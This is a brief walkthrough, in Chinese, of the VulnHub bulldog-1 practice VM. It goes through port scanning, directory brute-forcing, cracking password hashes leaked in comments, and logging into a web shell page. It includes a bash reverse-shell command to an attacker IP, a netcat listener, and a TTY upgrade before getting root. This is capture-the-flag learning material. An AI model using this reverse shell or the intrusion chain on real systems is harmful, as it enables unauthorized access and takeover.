# VulnHub: bulldog-1
- https://www.vulnhub.com/entry/bulldog-1,211/
## Walkthrough
使用VirtualBox開啟虛擬機，可自動取得靶機ip，利用nmap掃port，http端口80、8080，ssh端口23皆為開放狀態  
DirBuster爆破目錄，發現在/dev/中的source code有提示  
> Need these password hashes for testing. Django's default is too complex
> We'll remove these in prod. It's not like a hacker can do anything with a hash
把註解中的password拿去sha1 decode，求出nick跟sarah的password，試探用database(sarah)去登/admin/，成功，但無編輯權限  
發現/dev/shell網頁，登入sarah後擁有權限，試圖用bash反彈shell，失敗，最後用echo成功  
攻擊機:`nc -l 3333`  
靶機shell欄位:`echo "bash -i >& /dev/tcp/10.10.10.10/3333 0>&1" | bash`  
查看可疑user，發現bulldogadmin和django，查看bulldogadmin文件，發現可疑目錄/home/bulldogadmin/.hiddenadmindirectory
從note中發現提示  
> Literally run the app, give your account password >
用strings查看customPermissionApp，發現奇怪字眼  
`SUPERultH
imatePASH
SWORDyouH
CANTget`
研究了一下，刪掉H之後:  
`SUPERultimatePASSWORDyouCANTget`  
得到一串很像是密碼的東西，但並不確定，su試試，先解決error問題  
`python -c 'import pty;pty.spawn("/bin/bash")'`  
嘗試登入root帳號，密碼登入成功，回到/root目錄發現congrats.txt文件
`cat congrats.txt
Congratulations on completing this VM :D That wasn't so bad was it?

Let me know what you thought on twitter, I'm @frichette_n

As far as I know there are two ways to get root. Can you find the other one?

Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!`
